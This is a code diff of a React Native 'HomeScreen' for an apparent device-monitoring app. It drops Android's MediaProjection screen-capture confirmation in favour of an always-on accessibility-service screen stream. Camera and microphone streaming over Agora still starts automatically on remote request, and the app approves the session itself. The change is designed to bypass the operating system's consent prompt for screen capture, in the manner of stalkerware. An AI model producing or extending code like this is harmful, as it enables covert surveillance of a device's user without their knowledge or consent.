@@ -18,12 +18,9 @@ import {approveLiveSession, getClientToken, sendHeartbeat} from '../services/api
 import {checkPermissions, promptOpenSettings, requestPermissions} from '../services/permissions';
 import {
   isAccessibilityServiceEnabled,
-  isScreenCaptureActive,
   openAccessibilitySettings,
-  requestScreenCapture,
   startMonitoringService,
 } from '../services/nativeMonitoring';
-import {RtcSurfaceView, VideoSourceType} from 'react-native-agora';
 
 const HomeScreen = ({navigation}) => {
   const [loading, setLoading] = useState(true);
@@ -109,14 +106,9 @@ const HomeScreen = ({navigation}) => {
         );
 
         // Auto-start streaming for AirDroid-style seamless remote access
-        const captureActive = await isScreenCaptureActive();
-        if (!captureActive && (streaming || agoraService.isInChannel)) {
-          console.log('MediaProjection stopped by system. Cleaning up dead session...');
-          setStreaming(false);
-          await agoraService.leaveChannel().catch(() => {});
-        }
-
-        if (request && (!streaming || !captureActive) && !startingStream) {
+        // (camera + mic over Agora; screen monitoring is the lightweight
+        // accessibility-based See Screen stream)
+        if (request && !streaming && !startingStream) {
           startStreaming(deviceId, request._id);
         }
 
@@ -239,18 +231,9 @@ const HomeScreen = ({navigation}) => {
     try {
       if (!id || startingStream) return;
 
-      const isCaptureValid = await isScreenCaptureActive();
-
-      if (agoraService.isInChannel && isCaptureValid) {
+      if (agoraService.isInChannel) {
         setStreaming(true);
         return;
-      }
-
-      // If channel is open or stream was running but MediaProjection is dead, clean up first
-      if (agoraService.isInChannel || !isCaptureValid) {
-        console.log('Cleaning up dead channel session before re-joining...');
-        await agoraService.leaveChannel().catch(() => {});
-        setStreaming(false);
       }
 
       const now = Date.now();
@@ -260,7 +243,7 @@ const HomeScreen = ({navigation}) => {
       lastStreamAttemptRef.current = now;
 
       setStartingStream(true);
-      console.log('Starting stream for:', id);
+      console.log('Starting camera stream for:', id);
 
       let permissionsGranted = await checkPermissions();
       if (!permissionsGranted) {
@@ -269,11 +252,6 @@ const HomeScreen = ({navigation}) => {
 
       if (targetReqId) {
         await approveLiveSession(id, targetReqId).catch(() => {});
-      }
-
-      // Check if screen capture is already active in background
-      if (!isCaptureValid) {
-        await requestScreenCapture().catch(() => {});
       }
 
       // Get Agora token after device approval
@@ -328,19 +306,6 @@ const HomeScreen = ({navigation}) => {
 
   return (
     <View style={styles.container}>
-      {/* Hidden camera preview - rendered only when streaming */}
-      {streaming && (
-        <View style={styles.hiddenPreview}>
-          <RtcSurfaceView
-            canvas={{
-              uid: 0,
-              sourceType: VideoSourceType.VideoSourceCameraPrimary,
-            }}
-            style={styles.previewVideo}
-          />
-        </View>
-      )}
-
       {/* User Info Display */}
       <View style={styles.content}>
         <View style={styles.card}>
@@ -424,7 +389,7 @@ const HomeScreen = ({navigation}) => {
             </Text>
           </TouchableOpacity>
 
-          <Text style={styles.policyText}>Screen sharing always requires Android's MediaProjection confirmation. SMS and call-log insights are disabled in standard Play Store builds. App blocking requires managed-device mode.</Text>
+          <Text style={styles.policyText}>See Screen runs through the accessibility service (no MediaProjection needed — lightweight and always-on once enabled). Camera and microphone sessions stream over Agora. SMS and call-log insights are disabled in standard Play Store builds. App blocking requires managed-device mode.</Text>
         </View>
       </View>
     </View>
